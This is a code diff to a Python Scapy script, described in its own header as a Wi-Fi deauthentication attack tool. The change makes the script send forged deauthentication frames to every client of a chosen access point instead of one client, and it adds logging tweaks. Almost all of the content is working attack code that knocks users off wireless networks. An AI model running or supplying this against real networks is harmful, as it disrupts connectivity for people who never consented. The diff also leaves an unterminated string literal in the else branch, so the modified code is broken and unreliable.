@@ -1,5 +1,6 @@
 import os
 from scapy.all import *
+import time
 
 '''
 Wi-Fi Deauthenticationan Attack script by Sagi Saada and Shlomi Domennko
@@ -28,7 +29,7 @@ def MonitorMode(interface):
 	'''
 	choise = raw_input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")
 	if(choise == "y" or choise == "Y" or choise == ""):
-		os.system("bash monitor.sh "+interface)
+		os.system("bash start-monitor.sh "+interface)
 		print(interface+" mode changed to Monitor\n")
 	else:
 		return 0
@@ -37,6 +38,7 @@ def DeauthAttack(interface, device_target, client_target):
 	'''
 	DeauthAttack function - Start the deauth attack by given interface, AP mac address and client MAC address.
 	'''
+	print 'Deauthing',client_target,'from',device_target,'...'
 	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target, type=0, subtype= 12) / Dot11Deauth()
 	sendp(pkt, iface = interface, count = 10000, inter = .2)
 
@@ -96,7 +98,7 @@ def PacketHandler(pkt):
 			src = pkt.addr2
 			dest = pkt.addr3
 			if(dest in devices.keys()):
-				if(src not in clients.keys()):
+				if((src not in clients.keys()) and (src != dest) and (src not in devices.keys())):
 					clients[src] = devices[dest]
 					flag = 1
 		if(flag):
@@ -123,8 +125,9 @@ def Interface():
 	'''
 	Interface function - The main function that controls the flow of the attack. It calls other functions and combines all of them.
 	'''
+	#workers = []
 	try:
-		Welcome()
+		#Welcome()
 		interface = Device_Interface()
 		MonitorMode(interface)
 
@@ -145,21 +148,17 @@ def Interface():
 					break
 			
 			Display_Clients(device_target)
+			
 			while(1):
-				client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")
-				if(client_target == "exit" or choise == "quit"):
-					Exit()
-				if(client_target not in clients.keys()):
-					print("Bad Device MAC Address")
-				else:
-					DeauthAttack(interface, device_target, client_target)
-					break
-
+				for client in clients:
+					if(clients[client] == devices[device_target]):
+						print(client + " : " + device_target)
+						DeauthAttack(interface, device_target, client)
 		else:
-			print("Devices \ Clients Tables is null\n")
-		Exit()
+			print("\nDevices or Clients table is null\n
+			Exit()
 
-	except KeyboardInterrupt:
+	except KeyboardInterrupt:	
 		print ("\nInterruption detected.\n")
 		exit()
 
